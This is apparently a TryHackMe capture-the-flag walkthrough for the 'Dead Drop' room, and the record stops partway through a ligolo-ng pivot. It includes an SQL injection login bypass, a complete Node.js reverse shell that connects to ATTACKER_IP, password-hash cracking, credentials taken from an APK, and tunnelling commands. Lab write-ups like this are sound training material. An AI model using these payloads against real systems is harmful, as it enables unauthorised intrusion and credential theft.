# Dead Drop

**Difficulty:** 🟡 Medium · **Room:** [TryHackMe ↗](https://tryhackme.com/room/dead-drop)

DeadDrop Ltd's file-sharing application is your starting point. Everything you need to reach the domain controller can be discovered through careful enumeration and exploitation. Each question below marks a milestone in the attack chain.

---

## Reconnaissance 

I begin with an `nmap` scan to map out the attack surface:
`
```bash
nmap SERVER_IP -p- -sV -sC
```

Results:



So the `ssh` used `OpenSSH 9.6p1`, and `http` page ran on `Node.js Express` framework. The scan also revealed `/login` endpoint.
## Initial access 

I visit the webpage on port `80`. I got redirected to `/login` as expected. The page was a login page for DeadDrop secure file sharing platform. Username and password field didn't have any placeholders, so I didn't know the possible structure of them. Viewing the page source didn't reveal anything interesting. I checked if the login page was vulnerable to `SQLi`. And it was. By submitting the payload:

```SQL
' OR 1=1 -- -
```

I got access as an admin:

![](images/admin_dashboard.png)

## Reverse shell as `node`

The only function found on the dashboard was to upload a file. I immediately checked, if I could upload a `.php` file with a reverse shell. I clicked `preview` but didn't received a connection. Since the app used `Node.js/Express` I uploaded `.js` reverse shell (created using [this site](https://www.revshells.com/)):

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, "ATTACKER_IP", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

![](images/rev_shell.png)

## Escalation to `svc-drop`

After receiving connection I was placed in `/opt/app` directory. I quickly found `/backup` directory, which had `shadow.bak` file inside. After reading contest of this file, it appeared to be a hash value of password for `svc-drop` user. `hashcat` identified this hash format as `sha512crypt`. So I used `john` to crack this password. This worked:

![](images/hash_cracked.png)

I use those credentials to log via `ssh` as `svc-drop`:

![](images/ssh_svc_drop.png)

## Escalation

I listed all the directories, and again `/backup` directory showed up. However this time, it contained `deaddrop-mobile.apk` file. So mobile application was available too. I transferred the file to my system, and used [`mobsf`](https://mobsf.live/) to perform static analysis of the app. After processing the file, results showed, that there are hardcoded credentials. And that was true:

![](images/mobsf_resultr.png)

![](images/hardcode_creds.png)

I was looking for ways to pivot to the domain controller. By pinging it's IP address, it was only accessible if logged to the internal network as `svc-drop`. So I needed to pivot. I used `ligolo-ng` tool for pivoting. I didn't use SSH tunneling + proxychains, because it doesn't work well with `nmap` scans. To setup a pivot:

I installed `ligolo-ng`:

```bash
sudo apt install ligolo-ng
```

And transfered the agent to the machine server:

```bash
scp /usr/bin/ligolo-agent svc-drop@SERVER_IP:/tmp/ligolo-agent 
```

Then I run this command to start:

```bash
sudo ligolo-proxy -selfcert 
```

On the machine:

```bash
/tmp/ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert
```

Then on my machine I run `session` and picked the session with `svc-drop`. After that I run `autoroute`, picked the ip address of the machine, created new interface and started a tunnel.

